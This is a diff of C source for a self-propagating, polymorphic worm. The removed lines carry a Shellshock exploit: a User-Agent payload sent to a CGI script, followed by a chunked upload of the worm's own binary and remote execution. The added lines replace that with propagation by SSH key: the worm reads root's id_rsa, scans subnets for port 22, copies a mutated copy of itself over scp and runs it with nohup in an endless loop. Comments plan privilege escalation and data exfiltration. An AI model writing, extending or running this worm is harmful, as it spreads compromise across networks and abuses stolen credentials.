@@ -15,16 +15,16 @@
 #include <limits.h>
 #include <stdint.h>
 
-// Configuration - must be changed to a real scan
+// Configuration
 #define MAX_SUBNETS 4
 #define MAX_IP_LEN 16
 #define MAX_PATH_LEN 256
 #define CHUNK_SIZE 4000
-#define TARGET_SCRIPT "/cgi-bin/status.cgi"
-#define REMOTE_WORM_PATH "/tmp/worm"
-#define REMOTE_B64_PATH "/tmp/worm.b64"
+#define REMOTE_WORM_PATH "/tmp/worm2"
+#define REMOTE_B64_PATH "/tmp/worm2.b64"
+#define SSH_KEY_PATH "/root/.ssh/id_rsa"
 #define SCAN_TIMEOUT 2
-#define HTTP_TIMEOUT 5
+#define SSH_TIMEOUT 10
 
 // Subnets to scan
 const char* SUBNETS[MAX_SUBNETS] = {
@@ -177,11 +177,46 @@ char* get_executable_path(const char* argv0) {
 }
 
 /**
- * Scan target IP for port 80
+ * Read SSH private key from /root/.ssh/id_rsa
+ * Returns dynamically allocated key content (caller must free), or NULL on error
+ */
+char* read_ssh_key() {
+    FILE* f = fopen(SSH_KEY_PATH, "r");
+    if (!f) {
+        printf("[-] SSH key not found at %s\n", SSH_KEY_PATH);
+        return NULL;
+    }
+    
+    // Get file size
+    fseek(f, 0, SEEK_END);
+    long key_size = ftell(f);
+    fseek(f, 0, SEEK_SET);
+    
+    if (key_size <= 0) {
+        fclose(f);
+        return NULL;
+    }
+    
+    char* key_content = malloc(key_size + 1);
+    if (!key_content) {
+        fclose(f);
+        return NULL;
+    }
+    
+    size_t bytes_read = fread(key_content, 1, key_size, f);
+    fclose(f);
+    key_content[bytes_read] = '\0';
+    
+    printf("[+] SSH key loaded from %s (%zu bytes)\n", SSH_KEY_PATH, bytes_read);
+    return key_content;
+}
+
+/**
+ * Scan target IP for port 22 (SSH)
  * Returns 1 if port is open, 0 otherwise
  */
 int scan_target(const char* ip) {
-    printf("[*] Scanning %s for port 80...\n", ip);
+    printf("[*] Scanning %s for port 22 (SSH)...\n", ip);
     
     int sock = socket(AF_INET, SOCK_STREAM, 0);
     if (sock < 0) {
@@ -192,7 +227,7 @@ int scan_target(const char* ip) {
     struct sockaddr_in server_addr;
     memset(&server_addr, 0, sizeof(server_addr));
     server_addr.sin_family = AF_INET;
-    server_addr.sin_port = htons(80);
+    server_addr.sin_port = htons(22);
     
     if (inet_pton(AF_INET, ip, &server_addr.sin_addr) <= 0) {
         printf("[-] Error converting IP address\n");
@@ -214,88 +249,37 @@ int scan_target(const char* ip) {
 }
 
 /**
- * Execute a command on target via Shellshock
- * Returns dynamically allocated response string (caller must free), or NULL on error
+ * Execute command via SSH
+ * Returns 1 on success, 0 on failure
  */
-char* run_exploit(const char* ip, const char* command) {
-    int sock = socket(AF_INET, SOCK_STREAM, 0);
-    if (sock < 0) {
-        return NULL;
-    }
+int run_ssh_command(const char* ip, const char* command) {
+    char ssh_cmd[4096];
+    snprintf(ssh_cmd, sizeof(ssh_cmd),
+        "ssh -o StrictHostKeyChecking=no -o ConnectTimeout=%d "
+        "-i %s root@%s '%s' 2>/dev/null",
+        SSH_TIMEOUT, SSH_KEY_PATH, ip, command);
     
-    struct sockaddr_in server_addr;
-    memset(&server_addr, 0, sizeof(server_addr));
-    server_addr.sin_family = AF_INET;
-    server_addr.sin_port = htons(80);
-    
-    if (inet_pton(AF_INET, ip, &server_addr.sin_addr) <= 0) {
-        close(sock);
-        return NULL;
-    }
-    
-    // Set timeout
-    struct timeval timeout;
-    timeout.tv_sec = HTTP_TIMEOUT;
-    timeout.tv_usec = 0;
-    setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &timeout, sizeof(timeout));
-    setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, &timeout, sizeof(timeout));
-    
-    if (connect(sock, (struct sockaddr*)&server_addr, sizeof(server_addr)) < 0) {
-        close(sock);
-        return NULL;
-    }
-    
-    // Build Shellshock payload
-    char payload[2048];
-    snprintf(payload, sizeof(payload), "() { :; }; /bin/bash -c '%s'", command);
-    
-    // Build HTTP request
-    char request[4096];
-    snprintf(request, sizeof(request),
-        "GET %s HTTP/1.1\r\n"
-        "Host: %s:80\r\n"
-        "User-Agent: %s\r\n"
-        "Connection: close\r\n"
-        "\r\n",
-        TARGET_SCRIPT, ip, payload);
-    
-    // Send request
-    if (send(sock, request, strlen(request), 0) < 0) {
-        close(sock);
-        return NULL;
-    }
-    
-    // Read response
-    char* response = malloc(65536);
-    if (!response) {
-        close(sock);
-        return NULL;
-    }
-    
-    ssize_t total = 0;
-    ssize_t n;
-    while ((n = recv(sock, response + total, 65536 - total - 1, 0)) > 0) {
-        total += n;
-        if (total >= 65535) break;
-    }
-    response[total] = '\0';
-    
-    close(sock);
-    
-    // Extract body (skip headers)
-    char* body = strstr(response, "\r\n\r\n");
-    if (body) {
-        body += 4;
-        char* body_copy = strdup(body);
-        free(response);
-        return body_copy;
-    }
-    
-    return response;
+    int result = system(ssh_cmd);
+    return (result == 0) ? 1 : 0;
 }
 
 /**
- * Infect target by uploading and executing this worm
+ * Transfer file via SCP
+ * Returns 1 on success, 0 on failure
+ */
+int scp_transfer(const char* ip, const char* local_file, const char* remote_file) {
+    char scp_cmd[4096];
+    snprintf(scp_cmd, sizeof(scp_cmd),
+        "scp -o StrictHostKeyChecking=no -o ConnectTimeout=%d "
+        "-i %s %s root@%s:%s 2>/dev/null",
+        SSH_TIMEOUT, SSH_KEY_PATH, local_file, ip, remote_file);
+    
+    int result = system(scp_cmd);
+    return (result == 0) ? 1 : 0;
+}
+
+/**
+ * Infect target by uploading and executing this worm via SSH
  * Returns 1 on success, 0 on failure
  */
 int infect_target(const char* ip, const char* argv0) {
@@ -303,13 +287,19 @@ int infect_target(const char* ip, const char* argv0) {
         return 0;
     }
     
-    printf("[+] Web Server found at %s!\n", ip);
-    printf("[*] Attempting infection on %s via Shellshock...\n", ip);
+    printf("[+] SSH Server found at %s!\n", ip);
+    
+    // Check if SSH key exists
+    if (access(SSH_KEY_PATH, R_OK) != 0) {
+        printf("[-] SSH key not accessible at %s\n", SSH_KEY_PATH);
+        return 0;
+    }
+    
+    printf("[*] Attempting infection on %s via SSH...\n", ip);
     
     // 1. Read own binary -> Self-replication
     char* exe_path = get_executable_path(argv0);
     if (!exe_path) {
-        // Fallback: try /proc/self/exe
         printf("[-] Could not determine executable path, trying /proc/self/exe\n");
         exe_path = strdup("/proc/self/exe");
     }
@@ -366,121 +356,83 @@ int infect_target(const char* ip, const char* argv0) {
     
     printf("[*] Polymorphic mutation applied: %zu -> %zu bytes\n", file_size, mutated_size);
     
-    // Base64 encode the mutated content
-    size_t b64_len;
-    char* b64_content = base64_encode(mutated_content, mutated_size, &b64_len);
-    free(mutated_content);
-    
-    if (!b64_content) {
-        printf("[-] Error encoding binary\n");
+    // Write mutated content to temporary file
+    const char* temp_worm = "/tmp/worm2_temp";
+    FILE* temp_f = fopen(temp_worm, "wb");
+    if (!temp_f) {
+        printf("[-] Error creating temporary file\n");
+        free(mutated_content);
         return 0;
     }
     
-    // 2. Check if already infected (simple check)
-    // We try to ls the worm file. If it exists, we skip.
+    fwrite(mutated_content, 1, mutated_size, temp_f);
+    fclose(temp_f);
+    free(mutated_content);
+    
+    // Make temp file executable
+    chmod(temp_worm, 0755);
+    
+    // 2. Check if already infected
     char check_cmd[512];
-    snprintf(check_cmd, sizeof(check_cmd), 
-        "echo 'Content-type: text/plain'; echo; /bin/ls %s", REMOTE_WORM_PATH);
+    snprintf(check_cmd, sizeof(check_cmd), "test -f %s && echo 'EXISTS'", REMOTE_WORM_PATH);
     
-    char* check = run_exploit(ip, check_cmd);
-    if (check && strstr(check, REMOTE_WORM_PATH)) {
-        printf("[*] Target %s already infected.\n", ip);
-        free(check);
-        free(b64_content);
-        return 1;
-    }
-    if (check) free(check);
+    char result_file[256];
+    snprintf(result_file, sizeof(result_file), "/tmp/check_%s.txt", ip);
     
-    // 3. Clean up remote files -> Self-destruction, but if we change the CVE it must be changed
-    // char cleanup_cmd[512];
-    // snprintf(cleanup_cmd, sizeof(cleanup_cmd), "rm -f %s %s", REMOTE_B64_PATH, REMOTE_WORM_PATH);
-    // run_exploit(ip, cleanup_cmd);
+    char check_full_cmd[1024];
+    snprintf(check_full_cmd, sizeof(check_full_cmd),
+        "ssh -o StrictHostKeyChecking=no -o ConnectTimeout=%d "
+        "-i %s root@%s '%s' > %s 2>/dev/null",
+        SSH_TIMEOUT, SSH_KEY_PATH, ip, check_cmd, result_file);
     
-    // 4. Upload in chunks -> slice the worm code (the header used in the exploit 
-    // have a maximum size) and upload it to the infected target
-    printf("[*] Uploading worm (%zu bytes)...\n", b64_len);
+    system(check_full_cmd);
     
-    for (size_t i = 0; i < b64_len; i += CHUNK_SIZE) {
-        size_t chunk_len = (i + CHUNK_SIZE < b64_len) ? CHUNK_SIZE : (b64_len - i);
-        char* chunk = malloc(chunk_len + 1);
-        if (!chunk) continue;
-        
-        memcpy(chunk, b64_content + i, chunk_len);
-        chunk[chunk_len] = '\0';
-        
-        // Escape special characters for shell command
-        // Simple approach: wrap in single quotes and escape single quotes
-        char* escaped_chunk = malloc(chunk_len * 2 + 1);
-        if (escaped_chunk) {
-            size_t j = 0;
-            for (size_t k = 0; k < chunk_len; k++) {
-                if (chunk[k] == '\'') {
-                    escaped_chunk[j++] = '\'';
-                    escaped_chunk[j++] = '\\';
-                    escaped_chunk[j++] = '\'';
-                    escaped_chunk[j++] = '\'';
-                } else {
-                    escaped_chunk[j++] = chunk[k];
-                }
+    FILE* check_f = fopen(result_file, "r");
+    if (check_f) {
+        char check_result[64];
+        if (fgets(check_result, sizeof(check_result), check_f)) {
+            if (strstr(check_result, "EXISTS")) {
+                printf("[*] Target %s already infected.\n", ip);
+                fclose(check_f);
+                unlink(result_file);
+                unlink(temp_worm);
+                return 1;
             }
-            escaped_chunk[j] = '\0';
-            
-            char cmd[8192];
-            snprintf(cmd, sizeof(cmd), "/bin/echo -n '%s' >> %s", escaped_chunk, REMOTE_B64_PATH);
-            run_exploit(ip, cmd);
-            
-            free(escaped_chunk);
         }
-        
-        free(chunk);
+        fclose(check_f);
+        unlink(result_file);
     }
     
-    // 5. Decode -> once the worm is there we decode it to get the original code
-    printf("[*] Decoding payload...\n");
-    char decode_cmd[512];
-    snprintf(decode_cmd, sizeof(decode_cmd), 
-        "/usr/bin/base64 -d %s > %s", REMOTE_B64_PATH, REMOTE_WORM_PATH);
-    run_exploit(ip, decode_cmd);
+    // 3. Transfer worm via SCP
+    printf("[*] Transferring worm to %s via SCP...\n", ip);
+    if (!scp_transfer(ip, temp_worm, REMOTE_WORM_PATH)) {
+        printf("[-] Error transferring worm to %s\n", ip);
+        unlink(temp_worm);
+        return 0;
+    }
     
-    // 5.5. Make executable
-    printf("[*] Setting executable permissions...\n");
+    // Clean up local temp file
+    //unlink(temp_worm);
+    
+    // 4. Make executable on remote
+    printf("[*] Setting executable permissions on remote...\n");
     char chmod_cmd[512];
-    snprintf(chmod_cmd, sizeof(chmod_cmd), "/bin/chmod +x %s", REMOTE_WORM_PATH);
-    run_exploit(ip, chmod_cmd);
+    snprintf(chmod_cmd, sizeof(chmod_cmd), "chmod +x %s", REMOTE_WORM_PATH);
+    run_ssh_command(ip, chmod_cmd);
     
-    // 6. Execute
+    // 5. Execute worm on remote
     printf("[+] Executing worm on %s...\n", ip);
-    // We run it in background using nohup
-    // We verify the binary exists first, though we assume it does based on checks
     char exec_cmd[512];
-    snprintf(exec_cmd, sizeof(exec_cmd), 
-        "nohup %s > /tmp/worm.log 2>&1 &", REMOTE_WORM_PATH);
-    run_exploit(ip, exec_cmd);
+    snprintf(exec_cmd, sizeof(exec_cmd), "nohup %s > /tmp/worm2.log 2>&1 &", REMOTE_WORM_PATH);
+    run_ssh_command(ip, exec_cmd);
     
-    printf("[+] Infection command sent to %s\n", ip);
-    
-    free(b64_content);
+    printf("[+] Infection complete for %s\n", ip);
     return 1;
 }
 
-// TODO: function scan_network(): return the list of victims that can be attacked
-
-// TODO: function priviledge_escalation(): try to escalate privileges to root 
-// if necessary and not done with the propagation
-
-// TODO: function data_exfiltration(): or the attack we want to finally do
-
-
-
-
-
-
-
-
-
 int main(int argc, char* argv[]) {
     (void)argc;  // Suppress unused parameter warning
-    printf("=== C Shellshock Worm ===\n");
+    printf("=== C SSH Key-Based Worm ===\n");
     
     // Initialize random seed for polymorphic engine
     srand(time(NULL));
@@ -488,24 +440,26 @@ int main(int argc, char* argv[]) {
     // Delay to allow system to settle if just started
     sleep(2);
     
-    // Execute the attack to this machine, maybe can we decide with an args 
-    // if we want to attack this machine or just used to propagate
-    // priviledge_escalation();
-    // data_exfiltration();
+    // Check if SSH key exists
+    char* ssh_key = read_ssh_key();
+    if (!ssh_key) {
+        printf("[-] No SSH key found. Waiting for key...\n");
+        // In a real scenario, we might try to steal keys or wait
+        // For now, we'll just continue and let individual infections fail
+    } else {
+        free(ssh_key);
+    }
     
     // Infection loop
     while (1) {
         printf("\n[*] Starting infection round...\n");
         
-        // SUBNETS = scan_network() -> to be done
         for (int i = 0; i < MAX_SUBNETS; i++) {
             // Try hosts .2 and .3
             for (int host = 2; host < 4; host++) {
                 char ip[MAX_IP_LEN];
                 snprintf(ip, sizeof(ip), "%s.%d", SUBNETS[i], host);
                 
-                // Skip self (simple check, not robust for all network configs but good enough)
-                // In a real worm we'd check interfaces.
                 infect_target(ip, argv[0]);
             }
         }
